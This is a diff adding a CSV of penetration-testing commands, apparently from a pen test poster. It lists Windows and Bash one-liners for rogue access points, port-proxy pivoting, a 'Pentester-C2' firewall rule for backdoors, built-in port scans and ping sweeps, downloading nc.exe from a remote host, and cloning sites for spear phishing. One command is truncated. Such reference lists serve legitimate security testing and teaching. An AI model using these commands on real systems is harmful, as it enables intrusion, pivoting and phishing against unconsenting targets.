@@ -1,0 +1,36 @@
+Description,Usage,Command,Language,Source
+Configure a Windows machine as a WPA2-PSK Access Point.,"Usage scenario: Share a Windows machine?s Internet access with other systems wirelessly, or use a Windows machine to attract wireless clients into joining it for exploitation purposes.","netsh wlan set hostednetwork mode=allow ssid=<MYSSID>
+key=<MYPASSWORD> && netsh wlan start hostednetwork",CMD.exe,PenTest_Poster_whiteboard-commands.pdf
+"Configure a TCP port forwarding relay from IPv4 to IPv6 (v4tov4, v6tov6,
+and v6tov4 also supported).","Usage scenario: Pivot a TCP connection through a Windows machine using
+built-in functionality, converting IPv4 to IPv6 as needed.","netsh interface portproxy add v4tov6 listenport=<LPORT>
+listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>",CMD.exe,
+Get a list of TCP and UDP activity every 1 second.,"Usage scenario: Look for a connection coming in from a specific IP
+address or port to determine when the connection occurs, within 1 second.","netstat -naob 1 | find ""<IPADDR or PORT>""",CMD.exe,
+Get a list of all available attributes of all running processes.,"Usage scenario: Look through processes to determine what is running,
+including potentially exploitable software, malware, and other tools.",wmic process list full,CMD.exe,
+Get a list of services running inside of each process.,"Usage scenario: Look for running services that might be exploitable or
+running malware.",tasklist /svc,CMD.exe,
+Add a firewall rule to the built-in Windows firewall.,"Usage scenario: Allow connections into a new port for a
+listening backdoor, a service ready to deliver an exploit
+to clients, or a pivot.","New-NetFirewallRule -Action Allow
+-DisplayName Pentester-C2 -RemoteAddress
+<IPADDR>",Powershell,
+"Conduct a port scan of a target IP address, using only built-in
+features.","Usage scenario: Discover open ports on other target machines,
+using only built-in features.","1..1024 | % {echo ((new-object
+Net.Sockets.TcpClient).Connect(""<IPADDR>"",
+$_)) ""Port $_ is open!""} 2>$null ",Powershell,
+"Conduct a ping sweep of a target IP address
+space, using only built-in features.","Usage scenario: In post-exploitation,
+find additional target machines.","10.$_""; ping -n 1 -w 100
+10.10.10.$_ | Select-String ttl}",Powershell,
+On-Line Web Client Win 7,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.,"(New-Object
+System.Net.WebClient).DownloadFile(""http://
+10.10.10.10/nc.exe"",""c:\nc.exe"")",Powershell,
+On-Line Web Client Win 8 and later,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.," wget
+""http://10.10.10.10/nc.exe"" -outfile
+""c:\nc.exe"" ",Powershell,
+List the firewall rules and display them in grid view or CSV.,Usage scenario: Review the Windows built-in firewall rules to look for open ports to use for attacks and pivots.,"Get-NetFirewallRule -all | Out-GridView 
+Get-NetFirewallRule -all | Export-csv <file_path.csv>",Powershell,
+Clone a website to the local system.,"Usage scenario: Create a look-alike website to use for impersonation attacks, such as a site to direct victims to during spear phishing attacks.", wget -r -nH $URL or wget -mkEpnp $URL,BASH,
